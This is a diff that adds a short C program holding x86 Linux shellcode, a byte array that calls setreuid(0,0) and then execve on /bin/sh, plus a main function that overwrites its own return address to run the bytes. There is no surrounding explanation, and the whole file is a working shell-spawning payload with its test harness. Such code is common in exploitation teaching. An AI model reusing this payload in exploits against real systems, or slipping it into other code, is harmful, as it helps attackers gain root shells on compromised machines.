@@ -1,0 +1,17 @@
+char shellcode[] =
+
+"\x31\xc0"         // xor %eax,%eax 
+"\xb0\x46"         // mov $0x46,%al 
+"\x31\xdb"         // xor %ebx,%ebx 
+"\x31\xc9"         // xor %ecx,%ecx 
+"\xcd\x80"         // int $0x80 
+"\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31" 
+"\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+main() 
+{ 
+   int *ret; 
+ 
+   ret = (int *)&ret + 2; 
+   (*ret) = (int)shellcode; 
+} 
